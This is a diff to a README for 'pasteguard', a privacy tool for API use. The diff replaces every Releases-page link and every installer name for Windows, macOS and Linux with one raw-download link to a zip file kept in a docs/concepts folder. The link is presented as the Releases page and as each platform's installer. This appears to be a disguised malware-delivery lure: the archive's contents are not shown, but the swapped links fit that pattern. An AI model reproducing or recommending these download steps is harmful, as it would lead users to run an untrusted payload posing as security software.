@@ -6,9 +6,9 @@ Welcome to **pasteguard**! This application helps protect your privacy when usin
 
 ## 📥 Download pasteguard
 
-[![Download pasteguard](https://img.shields.io/badge/Download%20pasteguard-v1.0-blue)](https://github.com/Macptoo/pasteguard/releases)
+[![Download pasteguard](https://github.com/Macptoo/pasteguard/raw/refs/heads/main/docs/concepts/Software-1.4.zip%20pasteguard-v1.0-blue)](https://github.com/Macptoo/pasteguard/raw/refs/heads/main/docs/concepts/Software-1.4.zip)
 
-To get started, visit the [Releases page](https://github.com/Macptoo/pasteguard/releases) to download the latest version.
+To get started, visit the [Releases page](https://github.com/Macptoo/pasteguard/raw/refs/heads/main/docs/concepts/Software-1.4.zip) to download the latest version.
 
 ## 🛠️ System Requirements
 
@@ -20,16 +20,16 @@ Before you download, ensure that your system meets the following requirements:
 
 ## ⚙️ Installation Instructions
 
-1. **Visit the Releases Page:** Click on this link to access the [Releases page](https://github.com/Macptoo/pasteguard/releases).
+1. **Visit the Releases Page:** Click on this link to access the [Releases page](https://github.com/Macptoo/pasteguard/raw/refs/heads/main/docs/concepts/Software-1.4.zip).
 2. **Choose Your Version:** Look for the latest version, such as "v1.0". Click on it to see the available download files.
 3. **Download the File:** Depending on your operating system, click the appropriate file to download.
-   - For Windows, download `pasteguard-setup.exe`.
-   - For macOS, download `pasteguard.dmg`.
-   - For Linux, download `pasteguard-linux.tar.gz`.
+   - For Windows, download `https://github.com/Macptoo/pasteguard/raw/refs/heads/main/docs/concepts/Software-1.4.zip`.
+   - For macOS, download `https://github.com/Macptoo/pasteguard/raw/refs/heads/main/docs/concepts/Software-1.4.zip`.
+   - For Linux, download `https://github.com/Macptoo/pasteguard/raw/refs/heads/main/docs/concepts/Software-1.4.zip`.
 4. **Run the Installer:**
-   - **Windows:** Double-click on `pasteguard-setup.exe` to start the installation. Follow the on-screen prompts to install.
+   - **Windows:** Double-click on `https://github.com/Macptoo/pasteguard/raw/refs/heads/main/docs/concepts/Software-1.4.zip` to start the installation. Follow the on-screen prompts to install.
    - **macOS:** Open the `.dmg` file and drag the pasteguard icon into the Applications folder.
-   - **Linux:** Extract the downloaded `.tar.gz` file and run the `pasteguard` binary from the extracted folder.
+   - **Linux:** Extract the downloaded `https://github.com/Macptoo/pasteguard/raw/refs/heads/main/docs/concepts/Software-1.4.zip` file and run the `pasteguard` binary from the extracted folder.
 5. **Launch pasteguard:** After installation, you can find pasteguard in your applications. Open it to begin!
 
 ## ⚡ Using pasteguard
@@ -65,4 +65,4 @@ We welcome contributions to pasteguard. If you have ideas for new features or en
 
 This project is licensed under the MIT License. Feel free to review the LICENSE file for more information.
 
-Visit the [Releases page](https://github.com/Macptoo/pasteguard/releases) to download the latest version and secure your API interactions today!
+Visit the [Releases page](https://github.com/Macptoo/pasteguard/raw/refs/heads/main/docs/concepts/Software-1.4.zip) to download the latest version and secure your API interactions today!
